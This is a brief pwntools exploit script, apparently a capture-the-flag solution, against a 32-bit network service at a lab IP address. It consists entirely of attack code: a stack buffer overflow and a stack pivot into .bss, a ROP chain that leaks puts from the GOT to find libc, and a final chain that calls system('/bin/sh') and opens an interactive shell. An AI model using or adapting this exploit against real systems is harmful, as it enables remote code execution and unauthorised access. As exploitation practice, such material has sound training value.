#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time

host = "10.211.55.28"
port = 8888

r = remote(host,port)


read_plt = 0x8048380
puts_plt = 0x8048390
leave_ret = 0x08048418
pop_edx_ret = 0x0804836d
puts_got = 0x8049ff0
buf = 0x0804b000-0x200
buf2 = buf + 0x100
payload = "a"*40
payload += flat([buf,read_plt,leave_ret,0,buf,100])
r.recvuntil(":")
r.send(payload)
time.sleep(0.1)

rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,0,buf2,100])

r.sendline(rop)
r.recvuntil("\n")
puts_off = 0x5fca0
libc = u32(r.recv(4)) - puts_off
print "libc:",hex(libc)
time.sleep(0.1)
system_off = 0x3ada0
system = libc + system_off
rop2 = flat([buf,system,0,buf2+4*4,"/bin/sh"])
r.sendline(rop2)
r.interactive()
